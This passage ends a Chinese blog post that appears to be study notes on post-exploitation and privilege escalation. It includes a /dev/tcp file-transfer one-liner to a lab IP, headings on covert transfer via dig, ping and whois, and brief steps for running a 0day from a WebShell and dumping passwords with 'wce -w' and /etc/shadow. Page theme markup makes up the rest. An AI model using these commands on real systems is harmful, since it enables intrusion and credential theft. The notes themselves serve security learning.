+<div class="hljs code-wrapper"><pre><code class="hljs awk">cat &lt; <span class="hljs-regexp">/dev/</span>tcp<span class="hljs-regexp">/10.10.10.200/</span><span class="hljs-number">1337</span> &gt; <span class="hljs-number">1</span>.txt</code></pre></div>
+
+
+
+<h4 id="使用-dig-命令进行文件传输"><a href="#使用-dig-命令进行文件传输" class="headerlink" title="使用 dig 命令进行文件传输"></a>使用 dig 命令进行文件传输</h4><h4 id="使用-ping-命令进行文件传输"><a href="#使用-ping-命令进行文件传输" class="headerlink" title="使用 ping 命令进行文件传输"></a>使用 ping 命令进行文件传输</h4><h4 id="使用-whois-命令进行文件传输"><a href="#使用-whois-命令进行文件传输" class="headerlink" title="使用 whois 命令进行文件传输"></a>使用 whois 命令进行文件传输</h4><h4 id="利用HTTP-Server-进行文件传输"><a href="#利用HTTP-Server-进行文件传输" class="headerlink" title="利用HTTP Server 进行文件传输"></a>利用HTTP Server 进行文件传输</h4><p>具体参考：<a target="_blank" rel="noopener" href="https://paper.seebug.org/834/#download-files-from-http-server">红队后渗透测试中的文件传输技巧</a>.</p>
+<p>还有很多关于上传下载文件的好文章我放在参考链接处了。</p>
+<h2 id="2-执行-0day-进行提权尝试"><a href="#2-执行-0day-进行提权尝试" class="headerlink" title="2. 执行 0day 进行提权尝试"></a>2. 执行 0day 进行提权尝试</h2><p>在 WebShell 状态下执行提权 0day。通常通过 0day 添加普通用户为管理员，或者通过 0day 执行 其他可执行程序（例如木马、系统密码获取工具等）。</p>
+<h2 id="3-获取系统权限及操作系统的密码"><a href="#3-获取系统权限及操作系统的密码" class="headerlink" title="3. 获取系统权限及操作系统的密码"></a>3. 获取系统权限及操作系统的密码</h2><p>使用密码获取软件获取操作系统的密码。例如，“使用 wce –w”命令获取 Windows 系统当前登 录的明文密码，使用“cat /etc/shadow”命令获取 Linux 操作系统 Shadow 文件的内容。</p>
+<h1 id="0x04-参考资料"><a href="#0x04-参考资料" class="headerlink" title="0x04 参考资料"></a>0x04 参考资料</h1><ul>
+<li>《网络攻防实战研究：漏洞利用与提权》</li>
+<li><a target="_blank" rel="noopener" href="https://paper.seebug.org/834/#download-files-from-http-server">红队后渗透测试中的文件传输技巧</a></li>
+<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E2%80%94%E2%80%94%E9%80%9A%E8%BF%87cmd%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6%E7%9A%84N%E7%A7%8D%E6%96%B9%E6%B3%95.html">渗透技巧——通过cmd上传文件的N种方法</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.netspi.com/15-ways-to-download-a-file/">15 Ways to Download a File</a></li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%8F%90%E6%9D%83/">提权</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E6%8F%90%E6%9D%83/">提权</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%B8%8A%E4%BC%A0/">上传</a>
+                    
+                      <a class="hover-with-bg" href="/tags/%E4%B8%8B%E8%BD%BD/">下载</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/03/13/teler-%E5%9D%91%E4%B8%80%EF%BC%9A%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F%E8%A7%A3%E6%9E%90%E5%9D%91/">
+                        <span class="hidden-mobile">teler 坑一：日志格式解析坑</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments">
+                
+                
+  <div class="disqus" style="width:100%">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+      var disqus_config = function() {
+        this.page.url = 'https://greydr34d.github.io/2021/03/15/%E3%80%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%A0%94%E7%A9%B6%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/';
+        this.page.identifier = '/2021/03/15/%E3%80%8A%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%AE%9E%E6%88%98%E7%A0%94%E7%A9%B6%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E4%B8%8E%E6%8F%90%E6%9D%83%E3%80%8B%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%E5%87%86%E5%A4%87%E5%B7%A5%E4%BD%9C/';
+      };
+      Fluid.utils.waitElementVisible('disqus_thread', function () {
+        var d = document, s = d.createElement('script');
+        s.src = '//' + '' + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', new Date());
+        (d.head || d.body).appendChild(s);
+      });
+    </script>
+    <noscript>Please enable JavaScript to view the
+      <a target="_blank" href="https://disqus.com/?ref_noscript" rel="nofollow noopener noopener">comments powered by Disqus.</a>
+    </noscript>
+  </div>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.0/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.11/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
